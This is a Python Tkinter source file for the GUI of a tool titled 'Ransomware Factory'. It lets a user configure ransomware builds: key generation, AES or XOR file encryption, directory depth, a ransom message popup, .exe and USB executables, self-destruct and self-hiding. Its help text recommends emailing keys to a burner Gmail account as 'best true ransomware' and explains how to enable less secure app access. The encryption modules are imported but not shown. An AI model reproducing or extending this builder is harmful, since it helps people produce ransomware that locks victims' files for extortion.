# Import Tkinter
import tkinter as tk
from tkinter import ttk

# Import Platform for scrolling, and Sys for management
import platform
import sys

# Importing classes
from gui import GUI
from data import Data
from profile import Profile
from create import Create

class App:
	def __init__(self, file_name, width, height, bg_color, text_color):
		self.file_name = file_name
		self.width = width
		self.height = height
		self.bg_color = bg_color
		self.text_color = text_color

		# Ransomware Details
		self.profile = Profile()
		self.key_methods = ["Fernet key", "Secrets key", "Custom key"]
		self.encryption_methods = ["AES", "XOR"]
		self.storage_methods = ["Key File", "ID File", "Email"]
		self.message_types = ["None", "Text File", "GUI Popup"]
		self.show_console = ["No", "Yes"]
		self.file_types = [".py", ".exe", ".exe (USB)"]
		self.self_destruct_options = ["No", "Yes"]
		self.depth_options = ["All Below", "Current Dir", "Only Below", "Everything"]
		self.decryption_types = ["Pair", "One File (1)", "One File (2)"]
		self.hide_options = ["No", "Yes"]

	def create_app_window(self):
		# Init of window features
		self.window = tk.Tk()
		self.window.title("Ransomware Factory")
		self.window.configure(bg=self.bg_color)
		self.window.geometry(f"{self.width}x{self.height}")
		self.window.resizable(False, False)

		# Creating Class Instances
		self.GUI = GUI(__name__, self.window)

		# Add Widgets & Content
		self.add_widgets()

		# Running App Window
		self.window.mainloop()

	def add_widgets(self):
		# Creating All widgets 
		self.configure_styles()
		self.create_main_content()
		self.create_scrollable_area()
		self.create_non_scrollable_area()
		self.create_custom_widgets()

	def configure_styles(self):
		# Styles
		style = ttk.Style()
		style.configure("TButton", foreground=self.text_color, background=self.bg_color, padding=20)
		style.configure("TLabel", foreground=self.text_color, background=self.bg_color)
		style.configure("TFrame", background=self.bg_color)

	def create_main_content(self):
		# Create Top Label
		label = ttk.Label(self.window, text="Ransomware Factory", style="TLabel", font=('Roboto Condensed', 30, 'bold'))
		label.pack(pady=20)

		# Making The Horizontal Rule
		separator = tk.Frame(self.window, bg=self.text_color, height=4, bd=0)
		separator.pack(fill=tk.X, pady=(7, 0))

		# Creating Frame for the sub frames to go into
		self.main_frame = ttk.Frame(self.window, style="TFrame")
		self.main_frame.pack(fill=tk.BOTH, expand=True)

	def create_scrollable_area(self):
		# Creating Frame
		scrollable_frame = ttk.Frame(self.main_frame, style="TFrame")
		scrollable_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 20))

		# Creating Canvas with Scrollbar
		canvas = tk.Canvas(scrollable_frame, bg=self.bg_color)
		scrollbar = ttk.Scrollbar(scrollable_frame, orient="vertical", command=canvas.yview)
		canvas.configure(yscrollcommand=scrollbar.set)
		canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True) # Make the Canvas expand
		scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

		# Creating Content Frame
		self.content_frame = ttk.Frame(canvas, style="TFrame")
		self.content_frame.pack(fill=tk.BOTH, expand=True)
		canvas.create_window((0, 0), window=self.content_frame, anchor="nw")

		# Adding Content Frame Content
		self.create_scrollable_content(canvas)

		# Function to adjust the scroll region of the Canvas
		def on_configure(event):
			# Update the scroll region to the size of the content frame
			canvas.configure(scrollregion=canvas.bbox("all"))

		# Bind the <Configure> event of the Canvas to the on_configure function
		canvas.bind("<Configure>", on_configure)

		# Set focus to the scrollable_frame so it can receive MouseWheel events
		scrollable_frame.focus_set()

		# Bind the mouse wheel event to the scrollable_frame
		canvas.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		canvas.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		canvas.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

	def create_scrollable_content(self, canvas):
		# Config of content_frame
		self.content_frame.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		self.content_frame.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		self.content_frame.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		# Key Selection Frame & Scrolling
		keys_frame = tk.Frame(self.content_frame, width=7000, height=75, bg=self.bg_color)
		keys_frame.pack(fill=tk.BOTH, expand=False)
		keys_frame.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		keys_frame.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		keys_frame.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))
		
		self.current_key_method = tk.StringVar(value=self.key_methods[0])
		keygen_selection = tk.OptionMenu(keys_frame, self.current_key_method, *self.key_methods)#, style="Custom.TMenubutton")
		keygen_selection.config(fg=self.text_color, font=("Helvetica", 14))
		keygen_selection.place(x=536, y=32.5, width=130, height=35) 
		self.current_key_method.trace("w", self.on_keygen_selection)
		keygen_selection.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		keygen_selection.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		keygen_selection.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		keys_info_button = tk.Button(keys_frame, text="Keys Info", command= lambda: self.GUI.create_info_popup("Key Generation Info", 500, 310, self.bg_color, self.text_color, [("What are keys?", "Keys are the things that control encryption. Imagine encryption as the lock, and only a certain key can unlock it. You are choosing what type of key you want to use for your encryption. We recommend that you use Fernet, but any will work."), ("What are the options?", "The options are Fernet, Secrets, and Custom. Fernet is a certain key that uses AES in CBC with a 128-bit key. Secrets is a random 32-bit string key, and the custom is one of my own design. It generates 10,000 random letters and then 10,000 random numbers in a random order, then turns it into bytes. We recommend Fernet, then Secrets, then Custom. It is in order of most secure.")]))
		keys_info_button.place(x=6, y=5, width=90, height=25)
		keys_info_button.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		keys_info_button.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		keys_info_button.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		key_label = tk.Label(keys_frame, text="Choose the type of Key Generation you wish to use for it: ", bg=self.bg_color, fg=self.text_color, font=("Helvetica", 15))
		key_label.place(x=12, y=40, width=520, height=20)
		key_label.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		key_label.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		key_label.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		# Encryption Method
		encryption_frame = tk.Frame(self.content_frame, width=7000, height=75, bg=self.bg_color)
		encryption_frame.pack(fill=tk.BOTH, expand=False, pady=10)
		encryption_frame.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		encryption_frame.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		encryption_frame.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))
		
		self.current_encryption_method = tk.StringVar(value=self.encryption_methods[0])
		encryption_selection = tk.OptionMenu(encryption_frame, self.current_encryption_method, *self.encryption_methods)#, style="Custom.TMenubutton")
		encryption_selection.config(fg=self.text_color, font=("Helvetica", 14))
		encryption_selection.place(x=536, y=32.5, width=130, height=35) 
		self.current_encryption_method.trace("w", self.on_encryption_selection)
		encryption_selection.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		encryption_selection.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		encryption_selection.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		encryption_info_button = tk.Button(encryption_frame, text="Encryption Info", command= lambda: self.GUI.create_info_popup("File Encryption Info", 600, 370, self.bg_color, self.text_color, [("File Encryption Algorithms", "File encryption algorithms are used to secure files by converting their contents into a form that is unreadable without the correct decryption key. These algorithms typically operate on blocks of data within the file, encrypting each block individually. Popular file encryption algorithms include AES (Advanced Encryption Standard), which is known for its security and efficiency, and XOR encryption, which is simpler but less secure. File encryption algorithms ensure that even if a file is intercepted or accessed by unauthorized parties, its contents remain protected and unreadable without the decryption key."), ("AES vs XOR?", "AES (Advanced Encryption Standard) is a secure symmetric encryption algorithm that operates on fixed-size blocks of data, while XOR (Exclusive OR) encryption is a basic method that works on individual bits. AES is widely used for secure encryption, while XOR encryption is simpler and less secure, often used for basic purposes or as part of more complex algorithms.")]))
		encryption_info_button.place(x=6, y=5, width=115, height=25)
		encryption_info_button.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		encryption_info_button.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		encryption_info_button.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		encryption_label = tk.Label(encryption_frame, text="Choose the type of File Encryption you wish to use: ", bg=self.bg_color, fg=self.text_color, font=("Helvetica", 15))
		encryption_label.place(x=12, y=40, width=520, height=20)
		encryption_label.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		encryption_label.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		encryption_label.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		# Key Mover
		storage_frame = tk.Frame(self.content_frame, width=7000, height=75, bg=self.bg_color)
		storage_frame.pack(fill=tk.BOTH, expand=False, pady=10)
		storage_frame.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		storage_frame.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		storage_frame.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))
		
		self.current_storage_method = tk.StringVar(value=self.storage_methods[0])
		encryption_selection = tk.OptionMenu(storage_frame, self.current_storage_method, *self.storage_methods)
		encryption_selection.config(fg=self.text_color, font=("Helvetica", 14))
		encryption_selection.place(x=536, y=32.5, width=130, height=35) 
		self.current_storage_method.trace("w", self.on_storage_selection)
		encryption_selection.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		encryption_selection.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		encryption_selection.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		storage_info_button = tk.Button(storage_frame, text="Key Storage Info", command= lambda: self.GUI.create_info_popup("Key Storage Info", 600, 370, self.bg_color, self.text_color, [("Ways to save a key", "The offered ways to save a key are as follows: Key file, ID file, and email. A key file is the key saved as the file key.key, and is created when the file is ran. It was just the base key. ID file is almost the same thing, except that they key is encrypted too, and not just the pure key. This makes it so its much harder to decrypt without a decrypter. Email is last, and the most secure. This is where the script emails the key to a prefered email, along with the encryption info. This requires an email to use though, and needs some prep before."), ("Which one to pick?", "key file is good if you can take the file away, and pass it around like a real key. ID is good if you can't take the key file back, and still want some protection from unwanted decryption. Email is best true ransomware, but needs some things to be set up before hand. It's best to make a burner gmail acount, you need to go to settings, then scroll to the \"Less secure app access\" section and turn on the toggle switch. This makes it so you can use it. If you can get email to work, use it. If you can't, use key or ID.")]))
		storage_info_button.place(x=6, y=5, width=125, height=25)
		storage_info_button.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		storage_info_button.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		storage_info_button.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		email_checker_button = tk.Button(storage_frame, text="Test Email", command= lambda: self.GUI.create_email_checker(self.bg_color, self.text_color))
		email_checker_button.place(x=141, y=5, width=95, height=25)
		email_checker_button.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		email_checker_button.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		email_checker_button.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		storage_label = tk.Label(storage_frame, text="Choose the type of Key Storage you wish to use: ", bg=self.bg_color, fg=self.text_color, font=("Helvetica", 15))
		storage_label.place(x=12, y=40, width=520, height=20)
		storage_label.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		storage_label.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		storage_label.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		# Message Type Method
		message_frame = tk.Frame(self.content_frame, width=7000, height=75, bg=self.bg_color)
		message_frame.pack(fill=tk.BOTH, expand=False, pady=10)
		message_frame.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		message_frame.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		message_frame.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))
		
		self.current_message_type = tk.StringVar(value=self.message_types[0])
		message_selection = tk.OptionMenu(message_frame, self.current_message_type, *self.message_types)
		message_selection.config(fg=self.text_color, font=("Helvetica", 14))
		message_selection.place(x=536, y=32.5, width=130, height=35) 
		self.current_message_type.trace("w", self.on_message_selection)
		message_selection.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		message_selection.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		message_selection.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		message_info_button = tk.Button(message_frame, text="Message Info", command= lambda: self.GUI.create_info_popup("File Encryption Info", 600, 370, self.bg_color, self.text_color, [("File Encryption Algorithms", "File encryption algorithms are used to secure files by converting their contents into a form that is unreadable without the correct decryption key. These algorithms typically operate on blocks of data within the file, encrypting each block individually. Popular file encryption algorithms include AES (Advanced Encryption Standard), which is known for its security and efficiency, and XOR encryption, which is simpler but less secure. File encryption algorithms ensure that even if a file is intercepted or accessed by unauthorized parties, its contents remain protected and unreadable without the decryption key."), ("AES vs XOR?", "AES (Advanced Encryption Standard) is a secure symmetric encryption algorithm that operates on fixed-size blocks of data, while XOR (Exclusive OR) encryption is a basic method that works on individual bits. AES is widely used for secure encryption, while XOR encryption is simpler and less secure, often used for basic purposes or as part of more complex algorithms.")]))
		message_info_button.place(x=6, y=5, width=105, height=25)
		message_info_button.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		message_info_button.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		message_info_button.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		message_label = tk.Label(message_frame, text="Choose the Message Type to use after encryption: ", bg=self.bg_color, fg=self.text_color, font=("Helvetica", 15))
		message_label.place(x=12, y=40, width=520, height=20)
		message_label.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		message_label.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		message_label.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		# Show Console 
		console_frame = tk.Frame(self.content_frame, width=7000, height=75, bg=self.bg_color)
		console_frame.pack(fill=tk.BOTH, expand=False, pady=10)
		console_frame.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		console_frame.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		console_frame.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))
		
		self.current_console_status = tk.StringVar(value=self.show_console[0])
		console_selection = tk.OptionMenu(console_frame, self.current_console_status, *self.show_console)
		console_selection.config(fg=self.text_color, font=("Helvetica", 14))
		console_selection.place(x=536, y=32.5, width=130, height=35) 
		self.current_console_status.trace("w", self.on_console_selection)
		console_selection.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		console_selection.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		console_selection.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		console_info_button = tk.Button(console_frame, text="Console Info", command= lambda: self.GUI.create_info_popup("File Encryption Info", 400, 300, self.bg_color, self.text_color, [("What is a console?", "A console is what apears when you run a code script. It can hold text output from the code. It doesn't always apear though. You can turn it off, or leave it one. It will appear even if nothing outputs to it."), ("Should I turn it on?", "If you don't care, or have a reason to, don't. However, if you want to see a little bit of how it does things, leave it. You'll get output on what its doing right that moment, wether it be creating a key, encrypting a file, or completing. ")]))
		console_info_button.place(x=6, y=5, width=105, height=25)
		console_info_button.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		console_info_button.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		console_info_button.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		console_label = tk.Label(console_frame, text="Do you want to show the console when script is ran: ", bg=self.bg_color, fg=self.text_color, font=("Helvetica", 15))
		console_label.place(x=12, y=40, width=520, height=20)
		console_label.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		console_label.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		console_label.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		# File Type 
		file_frame = tk.Frame(self.content_frame, width=7000, height=75, bg=self.bg_color)
		file_frame.pack(fill=tk.BOTH, expand=False, pady=10)
		file_frame.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		file_frame.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		file_frame.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))
		
		self.current_file_type = tk.StringVar(value=self.file_types[0])
		file_selection = tk.OptionMenu(file_frame, self.current_file_type, *self.file_types)
		file_selection.config(fg=self.text_color, font=("Helvetica", 14))
		file_selection.place(x=536, y=32.5, width=130, height=35) 
		self.current_file_type.trace("w", self.on_file_selection)
		file_selection.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		file_selection.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		file_selection.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		file_info_button = tk.Button(file_frame, text="File Type Info", command= lambda: self.GUI.create_info_popup("File Encryption Info", 400, 300, self.bg_color, self.text_color, [("What is a console?", "A console is what apears when you run a code script. It can hold text output from the code. It doesn't always apear though. You can turn it off, or leave it one. It will appear even if nothing outputs to it."), ("Should I turn it on?", "If you don't care, or have a reason to, don't. However, if you want to see a little bit of how it does things, leave it. You'll get output on what its doing right that moment, wether it be creating a key, encrypting a file, or completing. ")]))
		file_info_button.place(x=6, y=5, width=105, height=25)
		file_info_button.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		file_info_button.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		file_info_button.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		console_label = tk.Label(file_frame, text="What file type do you want this to be: ", bg=self.bg_color, fg=self.text_color, font=("Helvetica", 15))
		console_label.place(x=12, y=40, width=520, height=20)
		console_label.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		console_label.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		console_label.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		# Self Destruct 
		destruct_frame = tk.Frame(self.content_frame, width=7000, height=75, bg=self.bg_color)
		destruct_frame.pack(fill=tk.BOTH, expand=False, pady=10)
		destruct_frame.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		destruct_frame.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		destruct_frame.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))
		
		self.current_destruct_option = tk.StringVar(value=self.self_destruct_options[0])
		destruct_selection = tk.OptionMenu(destruct_frame, self.current_destruct_option, *self.self_destruct_options)
		destruct_selection.config(fg=self.text_color, font=("Helvetica", 14))
		destruct_selection.place(x=536, y=32.5, width=130, height=35) 
		self.current_destruct_option.trace("w", self.on_destruction_selection)
		destruct_selection.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		destruct_selection.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		destruct_selection.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		destruct_info_button = tk.Button(destruct_frame, text="File Type Info", command= lambda: self.GUI.create_info_popup("File Encryption Info", 400, 300, self.bg_color, self.text_color, [("What is a console?", "A console is what apears when you run a code script. It can hold text output from the code. It doesn't always apear though. You can turn it off, or leave it one. It will appear even if nothing outputs to it."), ("Should I turn it on?", "If you don't care, or have a reason to, don't. However, if you want to see a little bit of how it does things, leave it. You'll get output on what its doing right that moment, wether it be creating a key, encrypting a file, or completing. ")]))
		destruct_info_button.place(x=6, y=5, width=105, height=25)
		destruct_info_button.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		destruct_info_button.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		destruct_info_button.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		destruct_label = tk.Label(destruct_frame, text="Do you want the file to Self-Destruct: ", bg=self.bg_color, fg=self.text_color, font=("Helvetica", 15))
		destruct_label.place(x=12, y=40, width=520, height=20)
		destruct_label.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		destruct_label.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		destruct_label.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		# Encryption Depth 
		depth_frame = tk.Frame(self.content_frame, width=7000, height=75, bg=self.bg_color)
		depth_frame.pack(fill=tk.BOTH, expand=False, pady=10)
		depth_frame.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		depth_frame.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		depth_frame.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))
		
		self.current_depth_option = tk.StringVar(value=self.depth_options[0])
		depth_selection = tk.OptionMenu(depth_frame, self.current_depth_option, *self.depth_options)
		depth_selection.config(fg=self.text_color, font=("Helvetica", 14))
		depth_selection.place(x=536, y=32.5, width=130, height=35) 
		self.current_depth_option.trace("w", self.on_depth_selection)
		depth_selection.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		depth_selection.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		depth_selection.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		depth_info_button = tk.Button(depth_frame, text="File Type Info", command= lambda: self.GUI.create_info_popup("File Encryption Depth Info", 400, 300, self.bg_color, self.text_color, [("What is a console?", "A console is what apears when you run a code script. It can hold text output from the code. It doesn't always apear though. You can turn it off, or leave it one. It will appear even if nothing outputs to it."), ("Should I turn it on?", "If you don't care, or have a reason to, don't. However, if you want to see a little bit of how it does things, leave it. You'll get output on what its doing right that moment, wether it be creating a key, encrypting a file, or completing. ")]))
		depth_info_button.place(x=6, y=5, width=105, height=25)
		depth_info_button.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		depth_info_button.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		depth_info_button.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		depth_label = tk.Label(depth_frame, text="What encryption depth do you want: ", bg=self.bg_color, fg=self.text_color, font=("Helvetica", 15))
		depth_label.place(x=12, y=40, width=520, height=20)
		depth_label.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		depth_label.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		depth_label.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		# Decryption Type 
		decryption_frame = tk.Frame(self.content_frame, width=7000, height=75, bg=self.bg_color)
		decryption_frame.pack(fill=tk.BOTH, expand=False, pady=10)
		decryption_frame.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		decryption_frame.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		decryption_frame.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))
		
		self.current_decryption_option = tk.StringVar(value=self.decryption_types[0])
		decryption_selection = tk.OptionMenu(decryption_frame, self.current_decryption_option, *self.decryption_types)
		decryption_selection.config(fg=self.text_color, font=("Helvetica", 14))
		decryption_selection.place(x=536, y=32.5, width=130, height=35) 
		self.current_decryption_option.trace("w", self.on_decryption_selection)
		decryption_selection.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		decryption_selection.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		decryption_selection.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		decryption_info_button = tk.Button(decryption_frame, text="File Type Info", command= lambda: self.GUI.create_info_popup("File Encryption Depth Info", 400, 300, self.bg_color, self.text_color, [("What is a console?", "A console is what apears when you run a code script. It can hold text output from the code. It doesn't always apear though. You can turn it off, or leave it one. It will appear even if nothing outputs to it."), ("Should I turn it on?", "If you don't care, or have a reason to, don't. However, if you want to see a little bit of how it does things, leave it. You'll get output on what its doing right that moment, wether it be creating a key, encrypting a file, or completing. ")]))
		decryption_info_button.place(x=6, y=5, width=105, height=25)
		decryption_info_button.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		decryption_info_button.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		decryption_info_button.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		decryption_label = tk.Label(decryption_frame, text="What type of decryption do you want: ", bg=self.bg_color, fg=self.text_color, font=("Helvetica", 15))
		decryption_label.place(x=12, y=40, width=520, height=20)
		decryption_label.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		decryption_label.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		decryption_label.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		# Hide File 
		hide_frame = tk.Frame(self.content_frame, width=7000, height=75, bg=self.bg_color)
		hide_frame.pack(fill=tk.BOTH, expand=False, pady=10)
		hide_frame.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		hide_frame.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		hide_frame.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))
		
		self.current_hide_option = tk.StringVar(value=self.hide_options[0])
		hide_selection = tk.OptionMenu(hide_frame, self.current_hide_option, *self.hide_options)
		hide_selection.config(fg=self.text_color, font=("Helvetica", 14))
		hide_selection.place(x=536, y=32.5, width=130, height=35) 
		self.current_hide_option.trace("w", self.on_hide_selection)
		hide_selection.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		hide_selection.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		hide_selection.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		hide_info_button = tk.Button(hide_frame, text="Hide File Info", command= lambda: self.GUI.create_info_popup("Hide File Info", 300, 170, self.bg_color, self.text_color, [("Should I hide the file?", "First, let me explain how it works. If you make it so it hides itself, when its ran, it attempts to make itself not seen in the file explorer. Whether you do it or not is only a matter of preference.")]))
		hide_info_button.place(x=6, y=5, width=105, height=25)
		hide_info_button.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		hide_info_button.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		hide_info_button.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

		hide_label = tk.Label(hide_frame, text="Do you want the file to hide itself when ran: ", bg=self.bg_color, fg=self.text_color, font=("Helvetica", 15))
		hide_label.place(x=12, y=40, width=520, height=20)
		hide_label.bind("<Button-4>", lambda event: canvas.yview_scroll(-1, "units"))
		hide_label.bind("<Button-5>", lambda event: canvas.yview_scroll(1, "units"))
		hide_label.bind("<MouseWheel>", lambda event: self.scroll_canvas(event, canvas))

	def on_keygen_selection(self, *args):
		value = self.current_key_method.get()
		self.profile.key_method = value
		self.keygen_text.config(text = "Key generation method: " + self.profile.key_method)

	def on_encryption_selection(self, *args):
		value = self.current_encryption_method.get()
		self.profile.encryption_method = value
		self.encryption_text.config(text = "File Encryption method: " + self.profile.encryption_method)

	def on_storage_selection(self, *args):
		value = self.current_storage_method.get()
		self.profile.storage_method = value
		self.storage_text.config(text = "Key Storage method: " + self.profile.storage_method)

	def on_message_selection(self, *args):
		value = self.current_message_type.get()
		self.profile.message_type = value
		self.message_text.config(text = "Message Type: " + self.profile.message_type)

	def on_console_selection(self, *args):
		value = self.current_console_status.get()
		self.profile.show_console = value
		self.console_text.config(text = "Show Console: " + self.profile.show_console)

	def on_file_selection(self, *args):
		value = self.current_file_type.get()
		self.profile.file_type = value
		self.file_text.config(text = "File Type: " + self.profile.file_type)

	def on_destruction_selection(self, *args):
		value = self.current_destruct_option.get()
		self.profile.self_destruct = value
		self.destruct_text.config(text = "Self Destruct: " + self.profile.self_destruct)

	def on_depth_selection(self, *args):
		value = self.current_depth_option.get()
		self.profile.encryption_depth = value
		self.depth_text.config(text = "Encryption Depth: " + self.profile.encryption_depth)

	def on_decryption_selection(self, *args):
		value = self.current_decryption_option.get()
		self.profile.decryption_type = value
		self.decryption_text.config(text = "Decryption Type: " + self.profile.decryption_type)

	def on_hide_selection(self, *args):
		value = self.current_hide_option.get()
		self.profile.hide_file = value
		self.hide_text.config(text = "Hide File: " + self.profile.hide_file)

	def scroll_canvas(self, event, canvas):
		# Adjust the scroll direction based on the operating system
		if platform.system() == 'Windows':
			canvas.yview_scroll(int(-2*(event.delta/120)), "units")
		elif platform.system() == 'Darwin':
			canvas.yview_scroll(int(-2 * event.delta), "units")
		else: # Assuming Linux or X11
			canvas.yview_scroll(int(-2*(event.delta/120)), "units")

	def create_non_scrollable_area(self):
		# Create Area for the info profile of file
		non_scrollable_frame = ttk.Frame(self.main_frame, style="TFrame", width=284.5, height=300)
		non_scrollable_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=False)

		# Creating Profile Text
		self.keygen_text = tk.Label(non_scrollable_frame, text="Key generation method: " + self.profile.key_method, font=("Helvetica", 12), bg=self.bg_color, fg=self.text_color)
		self.keygen_text.place(x=0, y=15)

		self.encryption_text = tk.Label(non_scrollable_frame, text="File Encryption method: " + self.profile.encryption_method, font=("Helvetica", 12), bg=self.bg_color, fg=self.text_color)
		self.encryption_text.place(x=0, y=60)

		self.storage_text = tk.Label(non_scrollable_frame, text="Key Storage method: " + self.profile.storage_method, font=("Helvetica", 12), bg=self.bg_color, fg=self.text_color)
		self.storage_text.place(x=0, y=105)

		self.message_text = tk.Label(non_scrollable_frame, text="Message Type: " + self.profile.message_type, font=("Helvetica", 12), bg=self.bg_color, fg=self.text_color)
		self.message_text.place(x=0, y=150)

